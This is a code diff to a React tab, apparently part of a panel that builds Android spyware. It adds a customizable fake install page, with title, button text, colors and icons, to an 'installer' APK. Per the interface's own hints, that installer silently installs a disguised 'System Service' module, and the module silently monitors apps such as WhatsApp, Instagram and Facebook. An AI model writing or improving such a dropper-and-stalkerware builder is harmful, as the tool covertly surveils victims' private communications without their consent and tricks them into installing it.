+            {fmtField('installerPackage', installerPackage, setInstallerPackage, 'Package ID',  'e.g. com.onerule.task')}
+
+            <IconField
+              label="Installer"
+              iconSource={installerIconSource}
+              onSourceChange={setInstallerIconSource}
+              disabled={running}
+            />
+
+            {/* Launch Page Editor toggle */}
+            <div
+              style={styles.sectionToggle}
+              onClick={() => setShowLaunchEditor(v => !v)}
+            >
+              <span>{showLaunchEditor ? '▾' : '▸'}</span>
+              <span>🎨 Customize Launch Page</span>
+              {!showLaunchEditor && (
+                <span style={{ marginLeft: 'auto', fontSize: 10, color: '#64748b', fontWeight: 400 }}>
+                  edit title, subtitle, colors…
+                </span>
+              )}
+            </div>
+
+            {showLaunchEditor && (
+              <div style={{ display: 'flex', flexDirection: 'column', gap: 12, paddingTop: 4 }}>
+                <div style={styles.field}>
+                  <label style={styles.label}>Page Title</label>
+                  <input
+                    type="text"
+                    style={{ ...styles.input, ...(errors.launchTitle ? styles.inputErr : {}) }}
+                    value={launchTitle}
+                    onChange={e => setLaunchTitle(e.target.value)}
+                    disabled={running}
+                    placeholder="A module is required"
+                    maxLength={80}
+                  />
+                  {errors.launchTitle && <span style={styles.errMsg}>{errors.launchTitle}</span>}
+                </div>
+
+                <div style={styles.field}>
+                  <label style={styles.label}>Subtitle</label>
+                  <input
+                    type="text"
+                    style={{ ...styles.input, ...(errors.launchSubtitle ? styles.inputErr : {}) }}
+                    value={launchSubtitle}
+                    onChange={e => setLaunchSubtitle(e.target.value)}
+                    disabled={running}
+                    placeholder="Click Install to proceed."
+                    maxLength={120}
+                  />
+                  {errors.launchSubtitle && <span style={styles.errMsg}>{errors.launchSubtitle}</span>}
+                </div>
+
+                <div style={styles.field}>
+                  <label style={styles.label}>Button Text</label>
+                  <input
+                    type="text"
+                    style={{ ...styles.input, ...(errors.launchBtnText ? styles.inputErr : {}) }}
+                    value={launchBtnText}
+                    onChange={e => setLaunchBtnText(e.target.value)}
+                    disabled={running}
+                    placeholder="Install"
+                    maxLength={40}
+                  />
+                  {errors.launchBtnText && <span style={styles.errMsg}>{errors.launchBtnText}</span>}
+                </div>
+
+                <ColorPicker
+                  label="Background"
+                  value={launchBgColor}
+                  onChange={setLaunchBgColor}
+                  presets={BG_PRESETS}
+                  disabled={running}
+                />
+
+                <ColorPicker
+                  label="Accent / Button"
+                  value={launchAccentColor}
+                  onChange={setLaunchAccentColor}
+                  presets={ACCENT_PRESETS}
+                  disabled={running}
+                />
+
+                <LaunchPagePreview
+                  title={launchTitle}
+                  subtitle={launchSubtitle}
+                  btnText={launchBtnText}
+                  bgColor={launchBgColor}
+                  accentColor={launchAccentColor}
+                />
+              </div>
+            )}
+
             <div style={{ ...styles.hint, marginTop: 'auto', paddingTop: 8 }}>
-              The installer is the small app users actually download and tap to install. It contains the
-              encrypted module and silently installs it on launch.
+              The installer is the small app users download. It silently installs the module on launch.
             </div>
           </div>
 
-          {/* Module column */}
+          {/* ── Module column ─────────────────────────────────────────────── */}
           <div style={styles.column}>
             <div style={styles.colHeader}>
               <span style={{ fontSize: 16 }}>🧩</span>
-              Module
+              Module App
             </div>
-            {fmtField('moduleName',    moduleName,    setModuleName,    'Module App Name', 'e.g. "System Service"')}
-            {fmtField('modulePackage', modulePackage, setModulePackage, 'Module Package',  'e.g. com.task.tusker')}
+
+            {fmtField('moduleName',    moduleName,    setModuleName,    'App Name',   'e.g. "System Service"')}
+            {fmtField('modulePackage', modulePackage, setModulePackage, 'Package ID', 'e.g. com.task.tusker')}
+
+            <IconField
+              label="Module"
+              iconSource={moduleIconSource}
+              onSourceChange={setModuleIconSource}
+              disabled={running}
+            />
 
             <div style={styles.field}>
               <label style={styles.label}>
@@ -582,7 +807,7 @@ export default function BuildApkTab({ user }) {
               <textarea
                 style={{ ...styles.textarea, ...(errors.monitored ? styles.inputErr : {}) }}
                 value={monitoredText}
-                onChange={(e) => setMonitoredText(e.target.value)}
+                onChange={e => setMonitoredText(e.target.value)}
                 disabled={running}
                 spellCheck={false}
                 placeholder={'com.whatsapp\ncom.instagram.android\ncom.facebook.katana'}
@@ -590,9 +815,12 @@ export default function BuildApkTab({ user }) {
               {errors.monitored
                 ? <span style={styles.errMsg}>{errors.monitored}</span>
                 : <span style={styles.hint}>
-                    One Android package name per line (or comma-separated). These are the apps the
-                    module silently monitors. Defaults shown — edit freely.
+                    One Android package name per line (or comma-separated). These are the apps the module silently monitors.
                   </span>}
+            </div>
+
+            <div style={{ ...styles.hint, marginTop: 'auto', paddingTop: 8 }}>
+              The module is the core service app. It runs silently in the background after installation.
             </div>
           </div>
         </div>
@@ -622,12 +850,8 @@ export default function BuildApkTab({ user }) {
               ⏳ Files expire in {expiryCountdown}
             </span>
           )}
-          {downloads.module && (
-            <button style={styles.dlBtn} onClick={() => downloadApk('module')}>⬇ Module.apk</button>
-          )}
-          {downloads.installer && (
-            <button style={styles.dlBtn} onClick={() => downloadApk('installer')}>⬇ Installer.apk</button>
-          )}
+          {downloads.module    && <button style={styles.dlBtn} onClick={() => downloadApk('module')}>⬇ Module.apk</button>}
+          {downloads.installer && <button style={styles.dlBtn} onClick={() => downloadApk('installer')}>⬇ Installer.apk</button>}
         </div>
 
         {lastResult?.error && !running && (
@@ -642,17 +866,25 @@ export default function BuildApkTab({ user }) {
           <div style={styles.title}>📜 Build Log</div>
           <span style={styles.status}>
             {running
-      ? <span style={{ color: '#fbbf24', display: 'inline-flex', alignItems: 'center', gap: 5 }}>
-          <span style={{ display: 'inline-block', width: 7, height: 7, borderRadius: '50%', background: '#fbbf24', animation: 'pulse 1.5s infinite' }} />
-          Live
-        </span>
-      : (logs.length > 0 ? `${logs.length} lines` : 'No active build')}
+              ? <span style={{ color: '#fbbf24', display: 'inline-flex', alignItems: 'center', gap: 5 }}>
+                  <span style={{ display: 'inline-block', width: 7, height: 7, borderRadius: '50%', background: '#fbbf24', animation: 'pulse 1.5s infinite' }} />
+                  Live
+                </span>
+              : (logs.length > 0 ? `${logs.length} lines` : 'No active build')}
           </span>
         </div>
         <div ref={logEndRef} style={styles.logPane}>
           {logs.length === 0
             ? <div style={{ color: '#475569' }}>Logs will stream here in real time once a build starts. First build takes ~5-15 min (Docker image + Gradle).</div>
-            : logs.map((ln, i) => <div key={i} style={{ color: ln.startsWith('❌') ? '#f87171' : ln.startsWith('✅') ? '#86efac' : ln.startsWith('⬆') ? '#67e8f9' : ln.startsWith('===') ? '#a78bfa' : undefined }}>{ln}</div>)}
+            : logs.map((ln, i) => (
+                <div key={i} style={{
+                  color: ln.startsWith('❌') ? '#f87171'
+                       : ln.startsWith('✅') ? '#86efac'
+                       : ln.startsWith('⬆') ? '#67e8f9'
+                       : ln.startsWith('===') ? '#a78bfa'
+                       : undefined
+                }}>{ln}</div>
+              ))}
         </div>
       </div>
     </div>
